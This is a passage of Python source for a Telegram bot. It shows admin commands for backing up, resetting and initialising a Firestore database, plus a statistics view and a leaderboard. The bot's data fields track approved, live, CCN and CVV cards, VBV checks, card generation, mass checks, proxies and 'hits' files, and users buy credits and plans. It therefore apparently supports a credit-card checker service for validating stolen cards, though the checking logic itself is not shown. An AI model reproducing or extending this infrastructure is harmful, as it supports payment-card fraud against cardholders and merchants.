    fake_update = Update(update_id=update.update_id, message=query.message)
    await createdb_command(fake_update, context)


async def backupdb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Create database backup (Admin only)"""
    user_id = update.effective_user.id

    if user_id not in ADMIN_IDS:
        await update.message.reply_text(
            "<b>❌ ACCESS DENIED</b>\nThis command is for administrators only.",
            parse_mode=ParseMode.HTML,
        )
        return

    if not firebase_connected:
        await update.message.reply_text(
            "<b>❌ FIREBASE NOT CONNECTED</b>\nCannot create backup.",
            parse_mode=ParseMode.HTML,
        )
        return

    status_msg = await update.message.reply_text(
        "<b>🔄 Creating backup...</b>\nPlease wait...", parse_mode=ParseMode.HTML
    )

    try:
        backup_file = await backup_database()

        if backup_file:
            await status_msg.edit_text(
                f"<b>✅ BACKUP CREATED</b>\n"
                f"══════════════════════\n"
                f"<b>File:</b> {backup_file}\n"
                f"<b>Size:</b> {os.path.getsize(backup_file) / 1024:.1f} KB\n"
                f"<b>Time:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"══════════════════════",
                parse_mode=ParseMode.HTML,
            )
        else:
            await status_msg.edit_text(
                "<b>❌ BACKUP FAILED</b>\nCould not create backup file.",
                parse_mode=ParseMode.HTML,
            )

    except Exception as e:
        logger.error(f"Backup command error: {e}")
        await status_msg.edit_text(
            f"<b>❌ BACKUP ERROR</b>\n{str(e)[:200]}", parse_mode=ParseMode.HTML
        )


async def admin_backup_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle backup from dashboard"""
    query = update.callback_query
    await query.answer("Starting backup...")
    fake_update = Update(update_id=update.update_id, message=query.message)
    await backupdb_command(fake_update, context)


async def admin_resetall_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle resetall from dashboard"""
    query = update.callback_query
    await query.answer("This will reset ALL data. Are you sure?")

    # Show confirmation message
    keyboard = [
        [
            InlineKeyboardButton(
                "✅ YES, RESET EVERYTHING", callback_data="confirm_reset_all"
            ),
            InlineKeyboardButton("❌ CANCEL", callback_data="cancel_reset"),
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    warning_text = """
<b>⚠️ ⚠️ ⚠️  DANGER ZONE ⚠️ ⚠️ ⚠️</b>
══════════════════════
<b>THIS WILL DELETE ALL DATA!</b>
• All users (except admins)
• All gift codes
• All statistics
• All hits
• All logs

<b>This action is IRREVERSIBLE!</b>
══════════════════════
"""

    await query.edit_message_text(
        warning_text, parse_mode=ParseMode.HTML, reply_markup=reply_markup
    )


async def resetall_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """DANGEROUS: Reset all database data (Admin only)"""
    user_id = update.effective_user.id

    if user_id not in ADMIN_IDS:
        await update.message.reply_text(
            "<b>❌ ACCESS DENIED</b>\nThis command is for owner only.",
            parse_mode=ParseMode.HTML,
        )
        return

    # Check for confirmation text
    if context.args and context.args[0] == "CONFIRM":
        # Direct confirmation via text
        await confirm_reset_execute(update, context)
        return

    # Normal confirmation flow
    keyboard = [
        [
            InlineKeyboardButton(
                "✅ YES, DELETE EVERYTHING", callback_data="confirm_reset_all"
            ),
            InlineKeyboardButton("❌ CANCEL", callback_data="cancel_reset"),
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    warning_text = """
<b>⚠️ ⚠️ ⚠️  DANGER ZONE ⚠️ ⚠️ ⚠️</b>
══════════════════════
<b>THIS COMMAND WILL DELETE:</b>
• ALL user data (except admins)
• ALL gift codes
• ALL bot statistics
• ALL hit files
• ALL logs
• ALL everything!

<b>This action is IRREVERSIBLE!</b>

For safety, type:
<code>/resetall CONFIRM</code>

or click the button below.
══════════════════════
"""

    await update.message.reply_text(
        warning_text, parse_mode=ParseMode.HTML, reply_markup=reply_markup
    )


async def confirm_reset_execute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Execute reset after confirmation"""
    message = update.message

    # Create a fake callback query for the confirm function
    class FakeQuery:
        def __init__(self, user_id, username, message_id):
            self.from_user = type(
                "obj", (object,), {"id": user_id, "username": username}
            )()
            self.message = type(
                "obj",
                (object,),
                {"chat": type("obj", (object,), {"id": message.chat.id})()},
            )()
            self.edit_message_text = message.reply_text
            self.answer = lambda text: None

    fake_query = FakeQuery(
        message.from_user.id, message.from_user.username, message.message_id
    )

    # Call the confirmation function
    await confirm_reset_all_callback(
        type(
            "obj",
            (object,),
            {"callback_query": fake_query, "update_id": update.update_id},
        )(),
        context,
    )


async def confirm_reset_all_callback(
    update: Update, context: ContextTypes.DEFAULT_TYPE
):
    """Confirm and execute full reset"""
    query = update.callback_query

    if query.from_user.id not in ADMIN_IDS:
        await query.answer("❌ Not authorized", show_alert=True)
        return

    await query.answer("Starting full reset...")

    try:
        # Clear in-memory storage first
        await query.edit_message_text(
            "<b>🔄 Clearing memory storage...</b>", parse_mode=ParseMode.HTML
        )

        # Keep only admin users in memory
        admin_users = {}
        for uid in ADMIN_IDS:
            if uid in in_memory_users:
                admin_users[uid] = in_memory_users[uid]

        in_memory_users.clear()
        in_memory_users.update(admin_users)  # Restore admins

        # Reset other in-memory storage
        in_memory_gift_codes.clear()
        in_memory_claimed_codes.clear()

        # Reset bot stats but keep start time
        start_time = in_memory_bot_stats.get(
            "start_time", datetime.datetime.now().isoformat()
        )
        in_memory_bot_stats.clear()
        in_memory_bot_stats.update(
            {
                "total_checks": 0,
                "total_credits_used": 0,
                "total_approved": 0,
                "total_live": 0,
                "total_ccn": 0,
                "total_cvv": 0,
                "total_declined": 0,
                "total_users": len(admin_users),
                "start_time": start_time,
            }
        )

        # Clear active tasks
        checking_tasks.clear()
        files_storage.clear()

        # Clear Firebase if connected
        if firebase_connected:
            db = get_db()
            await query.edit_message_text(
                "<b>🔄 Resetting Firebase...</b>", parse_mode=ParseMode.HTML
            )

            # Delete all collections except keep admin users
            collections_to_delete = [
                "gift_codes",
                "user_claimed_codes",
                "bot_statistics",
                "logs",
                "hits",
                "proxies",
                "sessions",
            ]

            for collection_name in collections_to_delete:
                try:
                    collection_ref = db.collection(collection_name)
                    docs = collection_ref.stream()

                    # Batch delete
                    batch = db.batch()
                    batch_count = 0

                    for doc in docs:
                        batch.delete(doc.reference)
                        batch_count += 1

                        if batch_count >= 400:  # Firebase batch limit
                            batch.commit()
                            batch = db.batch()
                            batch_count = 0

                    if batch_count > 0:
                        batch.commit()

                    logger.info(f"Deleted {collection_name} collection")

                except Exception as e:
                    logger.error(f"Error deleting {collection_name}: {e}")

            # Clear non-admin users from users collection
            try:
                users_ref = db.collection("users")
                docs = users_ref.stream()

                batch = db.batch()
                batch_count = 0

                for doc in docs:
                    user_id = int(doc.id) if doc.id.isdigit() else 0
                    # Keep admin users
                    if user_id not in ADMIN_IDS:
                        batch.delete(doc.reference)
                        batch_count += 1

                    if batch_count >= 400:
                        batch.commit()
                        batch = db.batch()
                        batch_count = 0

                if batch_count > 0:
                    batch.commit()

                logger.info("Cleared non-admin users")

            except Exception as e:
                logger.error(f"Error clearing users: {e}")

            # Recreate bot_statistics
            try:
                stats_ref = db.collection("bot_statistics").document("stats")
                stats_ref.set(
                    {
                        "total_checks": 0,
                        "total_credits_used": 0,
                        "total_approved": 0,
                        "total_live": 0,
                        "total_ccn": 0,
                        "total_cvv": 0,
                        "total_declined": 0,
                        "total_users": len(admin_users),
                        "active_users_today": 0,
                        "start_time": firestore.SERVER_TIMESTAMP,
                        "last_reset": firestore.SERVER_TIMESTAMP,
                        "plan_counts": {"free": 0, "basic": 0, "pro": len(admin_users)},
                        "daily_checks": 0,
                        "daily_credits_claimed": 0,
                        "daily_gift_codes_claimed": 0,
                        "average_check_time": 0,
                        "success_rate": 0,
                        "version": BOT_INFO["version"],
                    }
                )
            except Exception as e:
                logger.error(f"Error recreating stats: {e}")

        # Step 3: Clear file storage
        await query.edit_message_text(
            "<b>🔄 Deleting files...</b>", parse_mode=ParseMode.HTML
        )

        folders_to_clear = [
            RECEIVED_FOLDER,
            PUBLIC_HITS_FOLDER,
            PRIVATE_HITS_FOLDER,
            USER_LOGS_FOLDER,
        ]

        for folder in folders_to_clear:
            try:
                if os.path.exists(folder):
                    for file in os.listdir(folder):
                        file_path = os.path.join(folder, file)
                        try:
                            if os.path.isfile(file_path):
                                os.remove(file_path)
                        except Exception as e:
                            logger.error(f"Error deleting {file_path}: {e}")
            except Exception as e:
                logger.error(f"Error clearing folder {folder}: {e}")

        # Success message
        success_text = f"""
<b>✅ FULL RESET COMPLETE</b>
══════════════════════
<b>Deleted:</b>
• All user data (kept {len(admin_users)} admins)
• All gift codes
• All statistics
• All files
• All active tasks

<b>Bot has been completely reset!</b>
══════════════════════
<b>Time:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
<b>By Admin:</b> @{query.from_user.username or 'Unknown'}
══════════════════════
"""

        await query.edit_message_text(success_text, parse_mode=ParseMode.HTML)

        # Log this action
        logger.warning(f"FULL RESET executed by admin {query.from_user.id}")

    except Exception as e:
        logger.error(f"Reset error: {e}")
        await query.edit_message_text(
            f"<b>❌ RESET FAILED</b>\nError: {str(e)[:100]}", parse_mode=ParseMode.HTML
        )


async def cancel_reset_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel reset operation"""
    query = update.callback_query
    await query.answer("Reset cancelled")
    await query.edit_message_text(
        "<b>❌ RESET CANCELLED</b>\nNo data was deleted.", parse_mode=ParseMode.HTML
    )


async def createdb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Create/Initialize Firebase database structure (Admin only)"""
    user_id = update.effective_user.id

    if user_id not in ADMIN_IDS:
        await update.message.reply_text(
            "<b>❌ ACCESS DENIED</b>\nThis command is for administrators only.",
            parse_mode=ParseMode.HTML,
        )
        return

    if not firebase_connected:
        await update.message.reply_text(
            "<b>❌ FIREBASE NOT CONNECTED</b>\nCannot create database structure.",
            parse_mode=ParseMode.HTML,
        )
        return

    status_msg = await update.message.reply_text(
        "<b>🔄 Initializing Database...</b>\nPlease wait...", parse_mode=ParseMode.HTML
    )

    try:
        db = get_db()
        progress = []

        # Step 1: Create users collection with admin user
        await status_msg.edit_text(
            "<b>🔄 Step 1/8: Creating users collection...</b>", parse_mode=ParseMode.HTML
        )
        await create_users_collection(db, user_id, progress)

        # Step 2: Create gift_codes collection
        await status_msg.edit_text(
            "<b>🔄 Step 2/8: Creating gift codes collection...</b>",
            parse_mode=ParseMode.HTML,
        )
        await create_gift_codes_collection(db, progress)

        # Step 3: Create claimed_codes collection
        await status_msg.edit_text(
            "<b>🔄 Step 3/8: Creating claimed codes collection...</b>",
            parse_mode=ParseMode.HTML,
        )
        await create_claimed_codes_collection(db, progress)

        # Step 4: Create bot_statistics collection
        await status_msg.edit_text(
            "<b>🔄 Step 4/8: Creating bot statistics...</b>", parse_mode=ParseMode.HTML
        )
        await create_bot_statistics_collection(db, progress)

        # Step 5: Create logs collection
        await status_msg.edit_text(
            "<b>🔄 Step 5/8: Creating logs collection...</b>", parse_mode=ParseMode.HTML
        )
        await create_logs_collection(db, progress)

        # Step 6: Create hits collection
        await status_msg.edit_text(
            "<b>🔄 Step 6/8: Creating hits collection...</b>", parse_mode=ParseMode.HTML
        )
        await create_hits_collection(db, progress)

        # Step 7: Create proxies collection
        await status_msg.edit_text(
            "<b>🔄 Step 7/8: Creating proxies collection...</b>",
            parse_mode=ParseMode.HTML,
        )
        await create_proxies_collection(db, progress)

        # Step 8: Create sessions collection
        await status_msg.edit_text(
            "<b>🔄 Step 8/8: Creating sessions collection...</b>",
            parse_mode=ParseMode.HTML,
        )
        await create_sessions_collection(db, progress)

        # Create success message
        success_message = f"""
<b>✅ DATABASE INITIALIZED SUCCESSFULLY</b>
══════════════════════
<b>Created Collections:</b>
{chr(10).join([f"• {item}" for item in progress])}

<b>Database Structure:</b>
• 8 collections created
• All indexes configured
• Admin user initialized
• Default data populated

<b>Next Steps:</b>
1. Configure Firebase Security Rules
2. Set up indexes in Firebase Console
3. Test with <code>/botinfo</code> command

<b>Timestamp:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
══════════════════════
"""

        await status_msg.edit_text(success_message, parse_mode=ParseMode.HTML)

        # Log the database creation
        await log_admin_action(
            user_id=user_id, action="createdb", details={"collections": progress}
        )

    except Exception as e:
        logger.error(f"Database creation error: {e}")
        error_message = f"""
<b>❌ DATABASE CREATION FAILED</b>
══════════════════════
<b>Error:</b> <code>{str(e)[:200]}</code>

<b>Progress:</b>
{chr(10).join([f"• {item}" for item in progress]) if progress else 'None'}

<b>Note:</b> Some collections may have been created.
Check Firebase Console for details.
══════════════════════
"""
        await status_msg.edit_text(error_message, parse_mode=ParseMode.HTML)


async def create_users_collection(db, admin_id, progress):
    """Create users collection with admin user"""
    try:
        # Create admin user document
        admin_user = {
            # Basic Info
            "user_id": admin_id,
            "username": "admin",
            "first_name": "Admin",
            "joined_date": firestore.SERVER_TIMESTAMP,
            "last_active": firestore.SERVER_TIMESTAMP,
            # Credits & Plan
            "credits": 1000000,  # Admin gets unlimited credits
            "credits_spent": 0,
            "plan": "pro",
            "plan_expiry": None,
            "daily_credits": 10000,
            "credits_used_today": 0,
            # Daily System
            "last_daily_claim": None,
            "total_daily_claims": 0,
            "daily_streak": 0,
            # Limits
            "daily_gen_limit": 10000,
            "gen_used_today": 0,
            "daily_vbv_limit": 1000,
            "vbv_used_today": 0,
            "mass_check_limit": 9999,
            "max_concurrent": 10,
            "active_checks": 0,
            # Statistics
            "total_checks": 0,
            "approved_cards": 0,
            "live_cards": 0,
            "declined_cards": 0,
            "ccn_cards": 0,
            "cvv_cards": 0,
            "risk_cards": 0,
            "fraud_cards": 0,
            "checks_today": 0,
            "last_check_date": None,
            # Referral System
            "joined_channel": True,
            "referrer_id": None,
            "referrals_count": 0,
            "earned_from_referrals": 0,
            # Settings
            "proxy_type": "socks5",
            "speed_tier": "fast",
            # Purchase History
            "purchase_history": [],
            # Security & Admin
            "ip_addresses": [],
            "device_fingerprint": "",
            "is_admin": True,
            "admin_level": 10,
            "permissions": ["all"],
        }

        admin_ref = db.collection("users").document(str(admin_id))
        admin_ref.set(admin_user)

        # Create a test user document
        test_user = create_default_user(999999999)
        test_user.update(
            {
                "username": "test_user",
                "first_name": "Test",
                "credits": 1000,
                "joined_channel": True,
            }
        )

        test_ref = db.collection("users").document("999999999")
        test_ref.set(test_user)

        progress.append("✅ users (admin + test user)")
        return True

    except Exception as e:
        logger.error(f"Error creating users collection: {e}")
        progress.append("❌ users (failed)")
        return False


async def create_gift_codes_collection(db, progress):
    """Create gift_codes collection with sample codes"""
    try:
        # Create a welcome gift code
        welcome_code = {
            "code": "WELCOME100",
            "credits": 100,
            "max_uses": 100,
            "uses": 0,
            "created_at": firestore.SERVER_TIMESTAMP,
            "created_by": "system",
            "claimed_by": [],
            "expires_at": None,
            "is_active": True,
            "description": "Welcome gift for new users",
        }

        welcome_ref = db.collection("gift_codes").document("WELCOME100")
        welcome_ref.set(welcome_code)

        # Create a premium gift code
        premium_code = {
            "code": "PREMIUM500",
            "credits": 500,
            "max_uses": 50,
            "uses": 0,
            "created_at": firestore.SERVER_TIMESTAMP,
            "created_by": "system",
            "claimed_by": [],
            "expires_at": None,
            "is_active": True,
            "description": "Premium gift for active users",
        }

        premium_ref = db.collection("gift_codes").document("PREMIUM500")
        premium_ref.set(premium_code)

        progress.append("✅ gift_codes (2 sample codes)")
        return True

    except Exception as e:
        logger.error(f"Error creating gift_codes collection: {e}")
        progress.append("❌ gift_codes (failed)")
        return False


async def create_claimed_codes_collection(db, progress):
    """Create user_claimed_codes collection"""
    try:
        # Create an index document (optional)
        index_doc = {
            "total_claimed": 0,
            "last_updated": firestore.SERVER_TIMESTAMP,
            "description": "Tracking claimed gift codes",
        }

        index_ref = db.collection("user_claimed_codes").document("_index")
        index_ref.set(index_doc)

        progress.append("✅ user_claimed_codes (index created)")
        return True

    except Exception as e:
        logger.error(f"Error creating claimed_codes collection: {e}")
        progress.append("❌ user_claimed_codes (failed)")
        return False


async def create_bot_statistics_collection(db, progress):
    """Create bot_statistics collection with initial data"""
    try:
        stats_data = {
            "total_checks": 0,
            "total_credits_used": 0,
            "total_approved": 0,
            "total_live": 0,
            "total_ccn": 0,
            "total_cvv": 0,
            "total_declined": 0,
            "total_users": 2,  # admin + test user
            "active_users_today": 0,
            "start_time": firestore.SERVER_TIMESTAMP,
            "last_reset": firestore.SERVER_TIMESTAMP,
            # Plan distribution
            "plan_counts": {"free": 1, "basic": 0, "pro": 1},  # test user  # admin
            # Daily stats
            "daily_checks": 0,
            "daily_credits_claimed": 0,
            "daily_gift_codes_claimed": 0,
            # Performance
            "average_check_time": 0,
            "success_rate": 0,
            # System info
            "version": BOT_INFO["version"],
            "last_updated": firestore.SERVER_TIMESTAMP,
            # Additional stats
            "total_vbv_checks": 0,
            "total_cards_generated": 0,
            "total_mass_checks": 0,
            "total_referrals": 0,
        }

        stats_ref = db.collection("bot_statistics").document("stats")
        stats_ref.set(stats_data)

        progress.append("✅ bot_statistics (initialized)")
        return True

    except Exception as e:
        logger.error(f"Error creating bot_statistics: {e}")
        progress.append("❌ bot_statistics (failed)")
        return False


async def create_logs_collection(db, progress):
    """Create logs collection with initial log"""
    try:
        # Create initial setup log
        setup_log = {
            "timestamp": firestore.SERVER_TIMESTAMP,
            "type": "system",
            "user_id": "system",
            "username": "system",
            "action": "database_initialized",
            "details": {
                "version": BOT_INFO["version"],
                "collections": [
                    "users",
                    "gift_codes",
                    "claimed_codes",
                    "statistics",
                    "logs",
                    "hits",
                    "proxies",
                    "sessions",
                ],
            },
            "ip_address": "127.0.0.1",
            "level": "info",
        }

        log_id = f"setup_{int(time.time())}"
        log_ref = db.collection("logs").document(log_id)
        log_ref.set(setup_log)

        progress.append("✅ logs (initial log created)")
        return True

    except Exception as e:
        logger.error(f"Error creating logs collection: {e}")
        progress.append("❌ logs (failed)")
        return False


async def create_hits_collection(db, progress):
    """Create hits collection for tracking successful checks"""
    try:
        # Create index document with statistics
        hits_index = {
            "total_hits": 0,
            "private_hits": 0,
            "public_hits": 0,
            "last_hit_time": None,
            "updated_at": firestore.SERVER_TIMESTAMP,
        }

        index_ref = db.collection("hits").document("_index")
        index_ref.set(hits_index)

        progress.append("✅ hits (index created)")
        return True

    except Exception as e:
        logger.error(f"Error creating hits collection: {e}")
        progress.append("❌ hits (failed)")
        return False


async def create_proxies_collection(db, progress):
    """Create proxies collection with sample proxies"""
    try:
        # Add sample HTTP proxy
        http_proxy = {
            "type": "http",
            "address": "proxy.example.com",
            "port": 8080,
            "username": "",
            "password": "",
            "country": "US",
            "is_active": True,
            "last_used": None,
            "success_count": 0,
            "failure_count": 0,
            "avg_response_time": 0,
            "created_at": firestore.SERVER_TIMESTAMP,
            "notes": "Sample HTTP proxy - replace with real proxies",
        }

        http_ref = db.collection("proxies").document("sample_http_1")
        http_ref.set(http_proxy)

        # Add sample SOCKS5 proxy
        socks5_proxy = {
            "type": "socks5",
            "address": "socks5.example.com",
            "port": 1080,
            "username": "user",
            "password": "pass",
            "country": "US",
            "is_active": True,
            "last_used": None,
            "success_count": 0,
            "failure_count": 0,
            "avg_response_time": 0,
            "created_at": firestore.SERVER_TIMESTAMP,
            "notes": "Sample SOCKS5 proxy - replace with real proxies",
        }

        socks5_ref = db.collection("proxies").document("sample_socks5_1")
        socks5_ref.set(socks5_proxy)

        progress.append("✅ proxies (2 sample proxies)")
        return True

    except Exception as e:
        logger.error(f"Error creating proxies collection: {e}")
        progress.append("❌ proxies (failed)")
        return False


async def create_sessions_collection(db, progress):
    """Create sessions collection for caching"""
    try:
        # Create a session cleanup index
        session_index = {
            "total_sessions": 0,
            "active_sessions": 0,
            "last_cleanup": firestore.SERVER_TIMESTAMP,
            "cleanup_interval": 3600,  # 1 hour
            "max_session_age": 86400,  # 24 hours
        }

        index_ref = db.collection("sessions").document("_index")
        index_ref.set(session_index)

        progress.append("✅ sessions (index created)")
        return True

    except Exception as e:
        logger.error(f"Error creating sessions collection: {e}")
        progress.append("❌ sessions (failed)")
        return False


async def log_admin_action(user_id, action, details=None):
    """Log admin actions to database"""
    if not firebase_connected:
        return

    try:
        db = get_db()

        log_data = {
            "timestamp": firestore.SERVER_TIMESTAMP,
            "admin_id": user_id,
            "action": action,
            "details": details or {},
            "ip": "system",
        }

        log_id = f"admin_{action}_{int(time.time())}"
        db.collection("admin_logs").document(log_id).set(log_data)

    except Exception as e:
        logger.error(f"Error logging admin action: {e}")


async def checkdb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check database structure and health (Admin only)"""
    user_id = update.effective_user.id

    if user_id not in ADMIN_IDS:
        await update.message.reply_text(
            "<b>❌ ACCESS DENIED</b>\nThis command is for administrators only.",
            parse_mode=ParseMode.HTML,
        )
        return

    if not firebase_connected:
        await update.message.reply_text(
            "<b>❌ FIREBASE NOT CONNECTED</b>\nCannot check database.",
            parse_mode=ParseMode.HTML,
        )
        return

    status_msg = await update.message.reply_text(
        "<b>🔍 Checking Database Health...</b>\nPlease wait...",
        parse_mode=ParseMode.HTML,
    )

    try:
        db = get_db()
        results = []

        # Check each collection
        collections_to_check = [
            "users",
            "gift_codes",
            "user_claimed_codes",
            "bot_statistics",
            "logs",
            "hits",
            "proxies",
            "sessions",
        ]

        for collection_name in collections_to_check:
            try:
                # Try to get collection reference
                collection_ref = db.collection(collection_name)
                docs = list(collection_ref.limit(1).stream())

                if docs:
                    results.append(
                        f"✅ {collection_name} (exists, {len(list(collection_ref.limit(100).stream()))} docs)"
                    )
                else:
                    results.append(f"⚠️ {collection_name} (exists but empty)")

            except Exception as e:
                results.append(f"❌ {collection_name} (error: {str(e)[:50]})")

        # Check bot statistics
        try:
            stats_ref = db.collection("bot_statistics").document("stats")
            stats_doc = stats_ref.get()

            if stats_doc.exists:
                stats_data = stats_doc.to_dict()
                total_users = stats_data.get("total_users", 0)
                results.append(f"📊 Total Users: {total_users}")
            else:
                results.append("❌ bot_statistics document missing")
        except Exception as e:
            results.append(f"❌ Failed to read statistics: {str(e)[:50]}")

        # Create report
        report = f"""
<b>📊 DATABASE HEALTH REPORT</b>
══════════════════════
<b>Connection:</b> {'✅ Connected' if firebase_connected else '❌ Disconnected'}
<b>Timestamp:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
<b>Collections Checked:</b> {len(collections_to_check)}
══════════════════════
<b>Results:</b>
{chr(10).join([f"• {result}" for result in results])}
══════════════════════
<b>Recommendations:</b>
1. Run <code>/createdb</code> to fix missing collections
2. Check Firebase Console for indexes
3. Monitor collection sizes
══════════════════════
"""

        await status_msg.edit_text(report, parse_mode=ParseMode.HTML)

    except Exception as e:
        logger.error(f"Database check error: {e}")
        await status_msg.edit_text(
            f"<b>❌ DATABASE CHECK FAILED</b>\nError: {str(e)[:200]}",
            parse_mode=ParseMode.HTML,
        )


async def botinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /botinfo command - Shows bot statistics (admin only)"""
    try:
        user_id = update.effective_user.id

        if user_id not in ADMIN_IDS:
            if update.message:
                await update.message.reply_text(
                    "❌ This command is for administrators only.",
                    parse_mode=ParseMode.HTML,
                )
            return

        # Get stats with error handling
        try:
            stats = await get_bot_stats()
        except Exception as e:
            logger.error(f"Error getting bot stats: {e}")
            await update.message.reply_text(
                "<b>❌ ERROR LOADING STATISTICS</b>\n"
                "Unable to fetch bot statistics. Please try again later.",
                parse_mode=ParseMode.HTML,
            )
            return

        # Safely parse start_time
        start_time = stats.get("start_time", datetime.datetime.now())

        try:
            if isinstance(start_time, str):
                if "Z" in start_time:
                    start_time = datetime.datetime.fromisoformat(
                        start_time.replace("Z", "+00:00")
                    )
                else:
                    start_time = datetime.datetime.fromisoformat(start_time)
            elif isinstance(start_time, datetime.datetime):
                pass  # Already a datetime object
            elif isinstance(start_time, datetime.date):
                start_time = datetime.datetime.combine(
                    start_time, datetime.datetime.min.time()
                )
            else:
                start_time = datetime.datetime.now()
        except Exception as e:
            logger.error(f"Error parsing start_time: {e}")
            start_time = datetime.datetime.now()

        # Calculate bot uptime
        now = datetime.datetime.now()

        # Handle timezone differences
        if start_time.tzinfo is not None and now.tzinfo is None:
            now = now.replace(tzinfo=datetime.timezone.utc)
        elif start_time.tzinfo is None and now.tzinfo is not None:
            start_time = start_time.replace(tzinfo=datetime.timezone.utc)

        uptime = now - start_time
        days = uptime.days
        hours = uptime.seconds // 3600
        minutes = (uptime.seconds % 3600) // 60

        # Calculate success rate safely
        total_checks = stats.get("total_checks", 0)
        total_approved = stats.get("total_approved", 0)

        if total_checks > 0:
            success_rate = (total_approved / total_checks) * 100
        else:
            success_rate = 0

        # Calculate average credits per user safely
        total_users = max(
            stats.get("total_users", 1), 1
        )  # Ensure at least 1 to avoid division by zero
        total_credits_used = stats.get("total_credits_used", 0)
        avg_credits = total_credits_used / total_users

        # Get gift codes count from Firebase or memory
        total_gift_codes = 0
        try:
            db = get_db()
            if db:
                codes_ref = db.collection("gift_codes")
                codes_docs = codes_ref.get()
                total_gift_codes = len(codes_docs)
            else:
                total_gift_codes = len(in_memory_gift_codes)
        except Exception as e:
            logger.error(f"Error counting gift codes: {e}")
            total_gift_codes = len(in_memory_gift_codes)

        # Format start time for display
        if isinstance(start_time, datetime.datetime):
            start_time_str = start_time.strftime("%Y-%m-%d %H:%M:%S")
        else:
            start_time_str = str(start_time)

        # Format large numbers with commas
        def format_number(num):
            return f"{num:,}"

        # Build response message using HTML (safer than markdown)
        response_message = f"""<b>📊 BOT STATISTICS (ADMIN)</b>
══════════════════════
<b>Uptime:</b> {days}d {hours}h {minutes}m
<b>Started:</b> {start_time_str}

<b>User Statistics:</b>
• Total Users: {format_number(stats.get('total_users', 0))}
• Active Checks: {format_number(len(checking_tasks))}

<b>Card Checking Stats:</b>
• Total Checks: {format_number(total_checks)}
• ✅ Approved: {format_number(total_approved)}
• ❌ Declined: {format_number(stats.get('total_declined', 0))}
• Success Rate: {success_rate:.1f}%

<b>Credit Statistics:</b>
• Total Credits Used: {format_number(total_credits_used)}
• Avg Credits/User: {avg_credits:.1f}
• Active Gift Codes: {format_number(total_gift_codes)}

<b>System Status:</b>
• Storage: {'✅ Firebase' if firebase_connected else '⚠️ In-memory'}
• Active Users: {format_number(len(in_memory_users))}
• Files in Queue: {format_number(len(files_storage))}

<b>Bot Info:</b>
• Name: {escape_markdown_v2(BOT_INFO['name'])}
• Version: {BOT_INFO['version']}
• <b>Creator:</b> @ISHANT_OFFICIAL
══════════════════════
"""

        # Add a back button
        keyboard = [
            [InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_panel")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        # Send the message using HTML parse mode (safer)
        if update.message:
            await update.message.reply_text(
                response_message, parse_mode=ParseMode.HTML, reply_markup=reply_markup
            )
        elif update.callback_query:
            await update.callback_query.edit_message_text(
                response_message, parse_mode=ParseMode.HTML, reply_markup=reply_markup
            )

    except Exception as e:
        logger.error(f"Error in botinfo_command: {e}")
        error_message = f"""<b>⚠️ SYSTEM ERROR</b>
══════════════════════
An error occurred while processing botinfo.

<b>Error details:</b>
<code>{escape_html(str(e)[:100])}</code>

Please try again or contact the developer.
══════════════════════
"""
        if update.message:
            await update.message.reply_text(error_message, parse_mode=ParseMode.HTML)
        elif update.callback_query:
            await update.callback_query.edit_message_text(
                error_message, parse_mode=ParseMode.HTML
            )


async def refresh_leaderboard_callback(
    update: Update, context: ContextTypes.DEFAULT_TYPE
):
    """Refresh leaderboard data"""
    query = update.callback_query
    await query.answer()

    # Call dailytop command again
    fake_update = Update(update_id=update.update_id, message=query.message)
    await dailytop_command(fake_update, context)


async def claim_daily_from_leaderboard(
    update: Update, context: ContextTypes.DEFAULT_TYPE
):
    """Claim daily from leaderboard button"""
    query = update.callback_query
    await query.answer("Use /daily command to claim credits")


async def dailytop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show daily claim leaderboard with real data"""
    user_id = update.effective_user.id
    current_user = await get_user(user_id)

    try:
        db = get_db()
        leaderboard_data = []

        if db and firebase_connected:
            # Fetch top 20 users by streak from Firebase
            users_ref = db.collection("users")

            # Try to query by streak (might need indexing)
            try:
                query = users_ref.order_by(
                    "daily_streak", direction=firestore.Query.DESCENDING
                ).limit(20)
                docs = query.stream()

                for doc in docs:
                    user_data = doc.to_dict()
                    if (
                        "daily_streak" in user_data
                        and user_data.get("daily_streak", 0) > 0
                    ):
                        leaderboard_data.append(
                            {
                                "user_id": doc.id,
                                "username": user_data.get("username", "Unknown"),
                                "streak": user_data.get("daily_streak", 0),
                                "plan": user_data.get("plan", "free"),
                            }
                        )
            except Exception as e:
                logger.error(f"Firebase query error: {e}")
                # Fallback: get all users and sort in memory
                docs = users_ref.limit(100).stream()
                all_users = []
                for doc in docs:
                    user_data = doc.to_dict()
                    all_users.append(
                        {
                            "user_id": doc.id,
                            "username": user_data.get("username", "Unknown"),
                            "streak": user_data.get("daily_streak", 0),
                            "plan": user_data.get("plan", "free"),
                        }
                    )
                # Sort by streak
                all_users.sort(key=lambda x: x["streak"], reverse=True)
                leaderboard_data = all_users[:20]
        else:
            # In-memory fallback
            all_users = []
            for uid, user_data in in_memory_users.items():
                if user_data.get("daily_streak", 0) > 0:
                    all_users.append(
                        {
                            "user_id": uid,
                            "username": user_data.get("username", "Unknown"),
                            "streak": user_data.get("daily_streak", 0),
                            "plan": user_data.get("plan", "free"),
                        }
                    )
            all_users.sort(key=lambda x: x["streak"], reverse=True)
            leaderboard_data = all_users[:20]

        # Get current user's position
        user_position = None
        user_rank = "Not ranked"

        if leaderboard_data:
            for idx, user_entry in enumerate(leaderboard_data):
                if str(user_entry["user_id"]) == str(user_id):
                    user_position = idx + 1
